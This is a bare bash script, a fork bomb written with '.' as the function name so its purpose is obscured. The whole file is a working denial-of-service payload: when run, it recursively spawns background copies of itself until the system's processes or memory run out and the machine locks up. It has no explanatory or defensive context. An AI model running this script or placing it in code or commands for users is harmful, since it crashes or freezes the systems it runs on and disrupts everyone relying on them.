#!/bin/bash
.(){
	.|. &

}
	.
